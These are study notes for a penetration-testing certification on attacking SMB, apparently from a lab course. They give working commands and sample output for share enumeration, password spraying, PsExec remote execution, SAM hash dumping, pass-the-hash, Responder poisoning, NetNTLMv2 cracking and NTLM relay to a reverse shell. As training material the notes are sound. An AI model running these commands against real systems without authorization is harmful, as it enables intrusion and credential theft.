# 🖥️ 1. Attacking SMB

> [!info]  
> **SMB (Server Message Block)** is a network protocol used to provide shared access to **files and printers** across networked systems. Modern Windows commonly uses SMB directly over **TCP/445**, while older/alternative deployments can use SMB over **NetBIOS**, primarily **TCP/139** with UDP/137 and UDP/138.
> 
> **Samba** is the Unix/Linux implementation of SMB, allowing Linux/Unix systems and Windows clients to use SMB services.

### 🌐 SMB Ports

```text
SMB
├── TCP/445
│   └── SMB directly over TCP/IP
│
└── NetBIOS over TCP/IP
    ├── TCP/139
    ├── UDP/137
    └── UDP/138
```

> [!important]  
> When you find **TCP/445 or TCP/139**, think:
> 
> **SMB → Shares → Authentication → Permissions → RPC → Credentials → Remote Execution → Lateral Movement**

---

# 🧠 2. SMB + RPC Mental Model

SMB is often associated with **MSRPC (Microsoft Remote Procedure Call)**.

RPC allows applications to execute functions/procedures locally or remotely without needing to understand the underlying network communication. RPC can use **SMB named pipes** as its transport.

```text
                    SMB
                     │
          ┌──────────┴──────────┐
          ▼                     ▼
      📂 File Shares          🔧 RPC
                                │
                         Named Pipes
                                │
                                ▼
                    Remote system functions
```

This means SMB enumeration can lead to much more than file access.

You may be able to discover:

- Shares
    
- Users
    
- Groups
    
- Permissions
    
- Policies
    
- Services
    
- Logged-on users
    
- System information
    

And, with sufficient privileges:

- Remote command execution
    
- SAM hash extraction
    
- Pass-the-Hash
    
- Other administrative actions
    

---

# 🎯 3. SMB Attack Methodology

Think of SMB as a **large attack surface**, not simply a file-sharing protocol.

```text
                 🔎 SMB FOUND
                     │
              TCP/445 or 139
                     │
                     ▼
              🧭 ENUMERATION
                     │
          ┌──────────┼──────────┐
          ▼          ▼          ▼
       Shares     Null Auth   Version/OS
          │          │          │
          ▼          ▼          ▼
     Permissions   RPC       Vulnerabilities
          │          │
          └────┬─────┘
               ▼
         🔐 GET ACCESS
               │
       ┌───────┼────────┐
       ▼       ▼        ▼
     Files    Users   Credentials
       │       │        │
       └───────┼────────┘
               ▼
        🪟 WINDOWS TARGET
               │
      ┌────────┼─────────┐
      ▼        ▼         ▼
     RCE      SAM       PtH
      │        │         │
      └────────┼─────────┘
               ▼
        🚀 LATERAL MOVEMENT
```

---

# 🔎 4. SMB Enumeration

## 🛠️ 4.1 Nmap

Start by checking the standard SMB ports:

```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

Example output:

```text
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-19T13:16:04
|   start_date: N/A
```

### 🧠 What Did We Learn?

The scan reveals:

```text
SMB version
    ↓
Samba smbd 4.6.2

Hostname
    ↓
HTB

Implementation
    ↓
Samba → Linux/Unix-based SMB server
```

The source specifically identifies the important findings as:

- SMB version: `Samba smbd 4.6.2`
    
- Hostname: `HTB`
    
- Operating system: Linux-based based on the SMB implementation.
    

> [!tip]  
> Don't assume `139/445` automatically means Windows. **Samba can expose SMB on Linux.**
> 
> The SMB implementation/banner can help identify the underlying platform.

---

# 👤 5. Null Sessions / Anonymous Authentication

SMB can be configured to allow connections **without a username or password**.

This is commonly called a:

> **Null Session**

```text
Null Session
     │
     ├── Username: none
     └── Password: none
```

If successful, null authentication can expose information such as:

- Shares
    
- Usernames
    
- Groups
    
- Permissions
    
- Policies
    
- Services
    
- Other system information
    

Common tools supporting null sessions include:

```text
smbclient
smbmap
rpcclient
enum4linux
```

---

# 📂 6. Enumerating SMB Shares with smbclient

Use `smbclient` with:

- `-L` → list shares
    
- `-N` → use a null session / no password
    

```bash
smbclient -N -L //10.129.14.128
```

Example:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
notes           Disk      CheckIT
IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

### 🧠 What Matters?

Not every share is equally interesting.

```text
ADMIN$     → Administrative share
C$         → Default administrative share
IPC$       → Inter-Process Communication
notes      → Potentially interesting custom share
```

The **custom shares** are often worth investigating first because they may contain files created by users or applications.

---

# 🗺️ 7. Enumerating Share Permissions with smbmap

`smbmap` provides an advantage over simply listing shares: it shows the **permissions associated with each share**.

```bash
smbmap -H 10.129.14.128
```

Example:

```text
Disk                                                    Permissions     Comment
--                                                     ---------       -------
ADMIN$                                                  NO ACCESS       Remote Admin
C$                                                      NO ACCESS       Default share
IPC$                                                    READ ONLY       IPC Service (DEVSM)
notes                                                   READ, WRITE     CheckIT
```

### 🔥 Permission Interpretation

```text
NO ACCESS
   ↓
Usually skip initially

READ
   ↓
Download / inspect files

WRITE
   ↓
Upload / modify files

READ + WRITE
   ↓
🔥 Highly interesting
```

> [!important]  
> **Permissions are often more important than the share name.**
> 
> A share named `notes` with `READ, WRITE` can be more valuable than `ADMIN$` where you have `NO ACCESS`.

---

# 📂 8. Recursive Share Enumeration

Use `-r` or `-R` to recursively browse directories:

```bash
smbmap -H 10.129.14.128 -r notes
```

Example:

```text
Disk                                                    Permissions     Comment
--                                                     ---------       -------
notes                                                   READ, WRITE
.\notes\*
dr--r--r               0 Mon Nov  2 00:57:44 2020    .
dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

---

# 📥 9. Downloading Files from SMB

If you have read access, download interesting files.

```bash
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

Example:

```text
[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

### 🧠 After Downloading

Treat the file as an information source:

```text
SMB Share
   ↓
Download
   ↓
Read / Search
   ↓
Credentials?
   ↓
Username?
   ↓
Password?
   ↓
Hostname/IP?
   ↓
Configuration?
   ↓
Key / Token?
   ↓
Use information against another service
```

---

# 📤 10. Uploading Files to SMB

If the share is writable:

```bash
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

Example:

```text
[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

> [!warning]  
> **WRITE access is an important attack primitive.**
> 
> Don't stop at:
> 
> `READ → download files`
> 
> Also ask:
> 
> `WRITE → where does the uploaded file go, and what can consume it?`

---

# 🔧 11. RPC Enumeration with rpcclient

SMB can expose RPC functionality that can be used to enumerate a workstation or Domain Controller.

Use:

```bash
rpcclient -U'%' 10.10.110.17
```

The `%` represents a null authentication attempt.

Once inside:

```text
rpcclient $> enumdomusers
```

Example:

```text
user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

### 🧠 Why RPC Matters

RPC can turn:

```text
"SMB is open"
```

into:

```text
"Here are the users on the system."
```

And depending on configuration/privileges, RPC can also allow changes to system attributes.

---

# 🧰 12. enum4linux

`enum4linux` automates many common SMB enumeration operations.

It can enumerate:

- Workgroup/domain name
    
- Users
    
- Operating system information
    
- Groups
    
- Shared folders
    
- Password policy information
    

The newer Python implementation is:

```text
enum4linux-ng
```

Example:

```bash
./enum4linux-ng.py 10.10.11.45 -A -C
```

Example findings include:

```text
SMB is accessible on 445/tcp
SMB over NetBIOS is accessible on 139/tcp
Workgroup: WORKGROUP
NetBIOS names
SMB dialect information
```

---

# 🧰 13. SMB Enumeration Tool Selection

|Tool|Primary Use|
|---|---|
|`nmap`|Discover SMB ports, versions, scripts, security settings|
|`smbclient`|Interact directly with SMB shares|
|`smbmap`|Enumerate shares and permissions; download/upload|
|`rpcclient`|Direct RPC enumeration/interactions|
|`enum4linux-ng`|Automate common SMB enumeration|

### 🧠 Easy Memory Rule

```text
Nmap
 ↓
"Is SMB there and what does it look like?"

smbclient
 ↓
"Can I interact with the share?"

smbmap
 ↓
"What permissions do I have?"

rpcclient
 ↓
"What can RPC tell/change?"

enum4linux-ng
 ↓
"Give me broad automated enumeration"
```

---

# 🔐 14. When Null Sessions Don't Work

If SMB does not allow anonymous/null authentication, you need valid credentials.

Two common approaches are:

```text
🔨 Brute Force
🔫 Password Spraying
```

---

# 🔨 15. Brute Force vs Password Spraying

### Brute Force

Attempt many passwords against an account:

```text
User: Administrator

Password1
Password2
Password3
Password4
...
```

The danger is **account lockout**.

### Password Spraying

Try one common password against many users:

```text
Company01!
     │
     ├── Administrator
     ├── jrodriguez
     ├── admin
     ├── eperez
     ├── jurena
     └── ...
```

This reduces the number of authentication attempts against each individual account.

The source notes that **two to three attempts can typically be safe when combined with waiting 30–60 minutes**, depending on the environment and known lockout policy.

> [!warning]  
> Never blindly assume a number of attempts is "safe." The correct threshold depends on the target's actual account-lockout policy.

---

# 🎯 16. Password Spraying with CrackMapExec

Create a username list:

```bash
cat /tmp/userlist.txt
```

Example:

```text
Administrator
jrodriguez
admin
<SNIP>
jurena
```

Then spray the password:

```bash
crackmapexec smb 10.129.202.202 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

Example successful result:

```text
SMB         10.10.110.17 445    WIN7BOX
[-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE
[-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE
[-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE
...
[+] WIN7BOX\jurena:Company01! (Pwn3d!)
```

### Important Options

|Option|Purpose|
|---|---|
|`smb`|Target SMB|
|`-u`|Username or username list|
|`-p`|Password|
|`--local-auth`|Authenticate against local accounts rather than domain authentication|

> [!important]  
> CME normally stops after finding a successful login.
> 
> To continue spraying after success:

```text
--continue-on-success
```

The source notes that `--local-auth` is required when targeting a **non-domain-joined computer**.

---

# 🪟 17. Windows SMB vs Linux SMB

The attack surface differs depending on the SMB implementation and operating system.

### Linux/Samba

Common possibilities:

```text
📂 File system access
🔐 Privilege abuse
🐛 Known vulnerabilities
```

### Windows

The attack surface is generally larger.

Depending on the privileges of the compromised account, you may be able to:

```text
🖥️ Remote Command Execution
🔑 Extract SAM Hashes
👥 Enumerate Logged-on Users
🎟️ Pass-the-Hash
```

> [!important]  
> **The credential/privilege level you obtain determines what SMB can do for you.**
> 
> Valid low-privileged credentials may only provide share access, while local administrator credentials can potentially turn SMB into a **remote administration and execution mechanism**.

---

# 💻 18. Remote Code Execution over SMB

## 🧰 PsExec

**PsExec** is a Sysinternals utility for executing processes remotely.

The general mechanism is:

```text
Administrator Credentials
        │
        ▼
     ADMIN$
        │
        ▼
Upload service executable
        │
        ▼
DCE/RPC
        │
        ▼
Service Control Manager
        │
        ▼
Start remote service
        │
        ▼
Named Pipe
        │
        ▼
Interactive command execution
```

PsExec deploys its service executable to the remote `ADMIN$` share, uses DCE/RPC to communicate with the Service Control Manager, starts the service, and uses a named pipe for command communication.

---

# 🧰 19. PsExec Implementations

Several implementations exist:

|Tool|Description|
|---|---|
|Microsoft PsExec|Original Sysinternals implementation|
|Impacket PsExec|Linux/Python PsExec-like functionality|
|Impacket SMBExec|Similar approach without RemComSvc|
|Impacket atexec|Executes through Task Scheduler|
|CrackMapExec|Includes `smbexec` and `atexec` functionality|
|Metasploit PsExec|Ruby implementation|

---

# 💻 20. Impacket PsExec

Get help:

```bash
impacket-psexec -h
```

The target syntax is:

```text
[[domain/]username[:password]@]<target>
```

Example:

```bash
impacket-psexec administrator:'Password123!'@10.10.110.17
```

Example execution:

```text
[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....

C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```

### 🧠 Why SYSTEM?

The compromised account has administrative privileges, allowing PsExec to create/start a service. The resulting service executes with **SYSTEM-level privileges** in this example.

```text
Administrator
     │
     ▼
ADMIN$ writable
     │
     ▼
Upload executable
     │
     ▼
Create service
     │
     ▼
Start service
     │
     ▼
NT AUTHORITY\SYSTEM
```

---

# 🧰 21. Important Impacket PsExec Authentication Options

|Option|Meaning|
|---|---|
|`-hashes LMHASH:NTHASH`|Authenticate using NTLM hashes|
|`-no-pass`|Don't prompt for password|
|`-k`|Use Kerberos authentication|
|`-aesKey`|Use an AES key for Kerberos authentication|
|`-keytab`|Read keys from a keytab|
|`-dc-ip`|Domain Controller IP|
|`-target-ip`|Target machine IP|
|`-port`|SMB destination port|
|`-service-name`|Name of the service used|
|`-remote-binary-name`|Name of the executable uploaded remotely|

The source's help output documents these options and their purposes.

> [!tip]  
> Notice how `impacket-psexec` can authenticate using more than plaintext passwords:
> 
> **Password → NTLM hash → Kerberos ccache → AES key → keytab**
> 
> This connects directly with the credential and Kerberos techniques studied elsewhere in CPTS.

---

# ⚡ 22. CrackMapExec Remote Command Execution

CrackMapExec can execute commands against one or multiple SMB hosts.

Basic structure:

```text
crackmapexec smb <target> -u <user> -p <password> ...
```

For command execution:

```text
-x
```

→ CMD command

```text
-X
```

→ PowerShell command

Example:

```bash
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

Output:

```text
[+] .\Administrator:Password123! (Pwn3d!)
[+] Executed command via smbexec
nt authority\system
```

### Execution Method

If `--exec-method` isn't specified, CrackMapExec tries the `atexec` method first. If that fails, `smbexec` can be specified explicitly.

---

# 👥 23. Enumerating Logged-on Users

If the same local administrator credentials work on multiple machines, SMB can be used to identify users currently logged on.

Example:

```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Example findings:

```text
WIN7BOX\Administrator
WIN7BOX\jurena

WIN10BOX\Administrator
WIN10BOX\demouser
```

### 🧠 Why Is This Useful?

```text
Compromised Admin Credential
          │
          ▼
     Scan Network
          │
          ▼
Find Logged-on Users
          │
          ▼
Identify Interesting Accounts
          │
          ▼
Potential Credential / Lateral Movement Target
```

This is particularly useful in environments where **the same local administrator credentials are reused across machines**.

---

# 🔑 24. Extracting SAM Hashes

The **Security Account Manager (SAM)** is a Windows database containing local account password hashes.

With administrative privileges, the hashes can be extracted.

Possible uses:

```text
SAM Hash
   │
   ├──► Authenticate as another user
   │
   ├──► Crack password
   │        │
   │        └──► Reuse discovered password
   │
   └──► Pass-the-Hash
```

### CrackMapExec

```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

Example:

```text
[*] Dumping SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
```

> [!important]  
> The important part of a typical SAM entry is the **NT hash**.
> 
> Example:
> 
> `Administrator:500:<LM_HASH>:<NT_HASH>:::`

---

# 🎟️ 25. Pass-the-Hash (PtH)

If you obtain an NTLM hash but cannot crack it, you may still be able to authenticate using the hash directly.

This is called:

> **Pass-the-Hash (PtH)**

```text
Plaintext Password
       │
       ▼
    NTLM Hash
       │
       ▼
Instead of cracking
       │
       ▼
Use hash directly
       │
       ▼
Authenticate
```

The source notes that PtH can be performed with tools such as:

- Impacket
    
- SMBMap
    
- CrackMapExec
    

### CrackMapExec Example

```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Successful authentication:

```text
[+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

> [!success]  
> **Key idea:**
> 
> `NTLM hash ≠ useless just because it cannot be cracked.`
> 
> If the environment supports NTLM authentication in the relevant context, the hash itself can potentially become the credential.

---

# 🪤 26. Forced Authentication Attacks

SMB can also be abused from the opposite direction.

Instead of:

```text
Attacker → Victim SMB
```

we can create a malicious/fake SMB service and wait for a victim to authenticate **to us**.

```text
Victim
  │
  │ NTLM authentication
  ▼
Attacker's Fake SMB Server
  │
  ▼
Capture NetNTLMv1/v2
```

The source identifies **Responder** as a common tool for this technique.

---

# 🧪 27. Responder

Responder can listen for name-resolution traffic such as:

- LLMNR
    
- NBT-NS
    
- MDNS
    

and respond on behalf of systems the victim is trying to find.

Start it on an interface:

```bash
responder -I <interface name>
```

Example:

```bash
sudo responder -I ens33
```

---

# 🧠 28. Why LLMNR/NBT-NS Poisoning Works

Windows performs several steps when trying to resolve a hostname:

```text
1️⃣ Local hosts file
        ↓
2️⃣ Local DNS cache
        ↓
3️⃣ Configured DNS server
        ↓
4️⃣ Multicast name-resolution request
```

The source specifically describes the hosts file as:

```text
C:\Windows\System32\Drivers\etc\hosts
```

and explains that when normal resolution fails, the machine can issue a multicast query to other machines on the network.

### Example

User types:

```text
\\mysharefoder\
```

instead of:

```text
\\mysharedfolder\
```

If normal name resolution fails:

```text
Windows
   │
   ▼
DNS lookup fails
   │
   ▼
LLMNR/NBT-NS/MDNS query
   │
   ▼
Attacker's Responder
   │
   ▼
Fake SMB service
   │
   ▼
Victim attempts authentication
   │
   ▼
NetNTLM hash captured
```

The fundamental problem is that the victim has no reliable mechanism to verify the authenticity of the response in this scenario.

---

# 🎣 29. Responder Captured Credentials

Example output:

```text
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000...
```

This is **NetNTLMv2**, not the same thing as the user's stored NT hash.

### 🧠 Important Distinction

```text
NT Hash
   │
   └── Stored/derived credential material
       used by NTLM authentication

NetNTLMv2
   │
   └── Challenge-response authentication
       captured from network authentication
```

> [!important]  
> A captured NetNTLMv2 response can potentially be:
> 
> **1. Cracked offline**
> 
> **2. Relayed to another service**, depending on the target and authentication protections.

The source explicitly describes both possibilities.

---

# 🔓 30. Cracking NetNTLMv2

Responder stores captured hashes in:

```text
/usr/share/responder/logs/
```

The source uses Hashcat mode:

```text
5600
```

Command:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Example result:

```text
ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:...:P@ssword

Status...........: Cracked
Hash.Name........: NetNTLMv2
```

### 🧠 Why Multiple NetNTLMv2 Hashes Can Differ

The source explains that NTLMv2 uses randomized client-side and server-side challenges.

Therefore:

```text
Same password
     │
     ├── Authentication #1 → different response
     ├── Authentication #2 → different response
     └── Authentication #3 → different response
```

So multiple captured responses can look different even though they originate from the **same password**.

---

# 🔄 31. NTLM Relay

If the captured NetNTLMv2 response cannot be cracked, another possible path is **NTLM relay**.

```text
Victim
  │
  │ NTLM authentication
  ▼
Attacker / Relay
  │
  │ Forward authentication
  ▼
Target Service
```

The source demonstrates `impacket-ntlmrelayx`.

Before using it in the example, SMB is disabled in Responder:

```bash
cat /etc/responder/Responder.conf | grep 'SMB ='
```

Output:

```text
SMB = Off
```

Then:

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

Example:

```text
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Servers started, waiting for connections

[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
```

The example then demonstrates SAM extraction from the relayed administrative authentication.

> [!important]  
> **Responder and ntlmrelayx serve different roles in this workflow:**
> 
> ```text
> Responder
>     ↓
> Capture / trigger authentication
>     ↓
> ntlmrelayx
>     ↓
> Relay authentication to target
> ```
> 
> Therefore, when using this attack pattern, don't have Responder's SMB listener competing with `ntlmrelayx` for the same incoming SMB authentication.

---

# 💥 32. NTLM Relay → Command Execution

The source also demonstrates using `ntlmrelayx` with the `-c` option to execute a command after successful relay.

Conceptually:

```text
Victim
   │
   │ NTLM authentication
   ▼
Attacker
   │
   │ Relay
   ▼
Target
   │
   ▼
Command execution
```

The source uses a Base64-encoded PowerShell reverse shell as the command and receives the resulting shell with:

```bash
nc -lvnp 9001
```

Example result:

```text
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

> [!warning]  
> The important CPTS concept is the **authentication relay → privileged action** chain, not the specific reverse-shell payload.
> 
> Whether relay leads to command execution depends on the authentication protocol, target service, permissions, and security controls in the environment.

---

# 🔧 33. RPC Can Also Modify the System

RPC is not limited to enumeration.

Depending on configuration and privileges, it can potentially be used to:

- Change a user's password
    
- Create a new domain user
    
- Create a new shared folder
    

> [!warning]  
> These operations require **specific configurations and permissions**. Merely having RPC access does not automatically mean you can perform administrative changes.

---

# 🧭 34. Complete SMB Attack Decision Tree

```text
                     🖥️ SMB FOUND
                         │
                  TCP/445 or 139
                         │
                         ▼
                🔎 Nmap Enumeration
                         │
             ┌───────────┴───────────┐
             ▼                       ▼
       🐧 Samba/Linux             🪟 Windows
             │                       │
             └───────────┬───────────┘
                         ▼
                  👤 Null Session?
                         │
                ┌────────┴────────┐
                ▼                 ▼
               YES                NO
                │                 │
                ▼                 ▼
        smbclient/smbmap     🔐 Credentials
        rpcclient/enum4linux      │
                │                 ▼
                │          Password Spray /
                │            Brute Force
                │                 │
                └────────┬────────┘
                         ▼
                  📂 Enumerate Shares
                         │
                         ▼
                   📊 Permissions
                         │
                ┌────────┼────────┐
                ▼        ▼        ▼
              READ     WRITE   NO ACCESS
                │        │
                ▼        ▼
            Download   Upload
              Files      Files
                │        │
                └────┬───┘
                     ▼
              🔍 Search Information
                     │
                     ▼
              Credentials / Keys
                     │
                     ▼
              🪟 Windows Admin?
                     │
             ┌───────┼────────┐
             ▼       ▼        ▼
            RCE     SAM      Logged-on
                    Dump       Users
             │       │          │
             │       ▼          │
             │     NT Hash      │
             │       │          │
             │       ▼          │
             │     PtH ◄────────┘
             │
             ▼
        🚀 Lateral Movement
```

---

# 🧠 35. SMB Attack Primitives — Know What Each Finding Gives You

|Finding|What It Gives You|Think Next|
|---|---|---|
|TCP/445|SMB service|Enumerate|
|TCP/139|SMB over NetBIOS|Enumerate SMB/NetBIOS|
|Null session|Anonymous SMB/RPC access|Enumerate users/shares|
|READ share|File access|Download/search|
|WRITE share|File modification/upload|Determine impact|
|Valid SMB credentials|Authenticated access|Enumerate permissions|
|Administrator credentials|Administrative SMB access|RCE/SAM/other admin actions|
|SAM hashes|Local NT hashes|Crack or PtH|
|NTLM hash|Authentication material|PtH|
|Logged-on users|User presence information|Identify targets|
|NetNTLMv2|Challenge-response credential material|Crack or relay|
|RPC access|Enumeration/functionality|Enumerate or perform permitted actions|
|Writable `ADMIN$` + admin rights|Remote service deployment|PsExec / SMB execution|
|Internal name-resolution weakness|Forced authentication opportunity|Responder|
|Captured authentication|Credential/relay opportunity|Hashcat or relay|

---

# 🧰 36. SMB Tool Cheat Sheet

|Tool|When to Use|Main Purpose|
|---|---|---|
|`nmap`|SMB first discovered|Ports, version, scripts, SMB security information|
|`smbclient`|Need direct share interaction|Browse/download/upload|
|`smbmap`|Need permissions quickly|Shares, permissions, recursive enumeration|
|`rpcclient`|RPC available|Users and RPC functions|
|`enum4linux-ng`|Need broad automated enumeration|Users, groups, shares, OS, policies|
|`CrackMapExec`|Have credentials|Spraying, execution, logged-on users, SAM|
|`impacket-psexec`|Have administrative SMB credentials|Remote command execution|
|`impacket-smbexec`|PsExec-style execution needed|Remote command execution|
|`impacket-atexec`|Task Scheduler execution|Remote command execution|
|`Responder`|Forced authentication/name-resolution attack applicable|Capture NetNTLM|
|`Hashcat`|Captured NetNTLMv2|Offline password cracking|
|`ntlmrelayx`|Relay conditions exist|Relay authentication to another service|

---

# ⚡ 37. One-Minute SMB Methodology

```text
1️⃣ FIND
   └─ TCP/445 or TCP/139

2️⃣ ENUMERATE
   └─ nmap -sV -sC -p139,445 <TARGET>

3️⃣ TEST NULL SESSION
   ├─ smbclient -N -L //<TARGET>
   ├─ smbmap -H <TARGET>
   ├─ rpcclient -U'%' <TARGET>
   └─ enum4linux-ng

4️⃣ ENUMERATE SHARES
   └─ Names + permissions

5️⃣ READ?
   └─ Download everything interesting
   └─ Search for credentials/configs/keys

6️⃣ WRITE?
   └─ Determine where files can be uploaded
   └─ Determine what can consume them

7️⃣ NO NULL SESSION?
   └─ Use known credentials
   └─ Consider password spraying
   └─ Brute force only when appropriate

8️⃣ HAVE WINDOWS ADMIN?
   ├─ Remote execution
   ├─ SAM dumping
   ├─ Logged-on users
   └─ Pass-the-Hash

9️⃣ HAVE NT HASH?
   └─ Try PtH before spending time cracking

🔟 HAVE NETNTLMV2?
   ├─ Hashcat -m 5600
   └─ Consider NTLM relay when applicable

1️⃣1️⃣ FORCED AUTHENTICATION POSSIBLE?
   └─ Responder / name-resolution poisoning

1️⃣2️⃣ RPC AVAILABLE?
   └─ Enumerate users/functions
   └─ Check whether permitted changes are possible

1️⃣3️⃣ CORRELATE
   └─ Credentials → other hosts/services
   └─ Users → lateral movement
   └─ Hashes → PtH
```

---

# 🧠 38. The Most Important SMB Mental Model

```text
                  🖥️ SMB
                    │
                    ▼
              🔎 ENUMERATE
                    │
       ┌────────────┼────────────┐
       ▼            ▼            ▼
    Shares         RPC       Authentication
       │            │            │
       ▼            ▼            ▼
 Permissions      Users       Credentials
       │            │            │
       └────────────┼────────────┘
                    ▼
               🔐 ACCESS
                    │
          ┌─────────┼─────────┐
          ▼         ▼         ▼
        Files      Admin    NetNTLM
          │         │         │
          ▼         ▼         ▼
      Secrets      RCE      Crack/Relay
                    │
                    ▼
              🚀 LATERAL MOVE
```

> [!success]
> 
> ### 🏆 CPTS Key Takeaways
> 
> **SMB is much more than file sharing.**
> 
> Remember the progression:
> 
> **SMB → Shares → Permissions → Information → Credentials → Privileges → Execution → Lateral Movement**
> 
> The highest-value transitions to remember are:
> 
> - **Null session → enumerate users/shares**
>     
> - **READ → download and hunt for sensitive information**
>     
> - **WRITE → investigate upload/abuse possibilities**
>     
> - **Credentials → enumerate authenticated SMB capabilities**
>     
> - **Administrator → RCE / SAM / logged-on users**
>     
> - **SAM NT hash → crack or Pass-the-Hash**
>     
> - **NetNTLMv2 → crack or potentially relay**
>     
> - **RPC → enumerate and potentially perform permitted administrative actions**
>     
> 
> The core CPTS mindset is:
> 
> **Don't just ask "Is SMB vulnerable?" — ask "What does my current level of SMB access allow me to do next?"**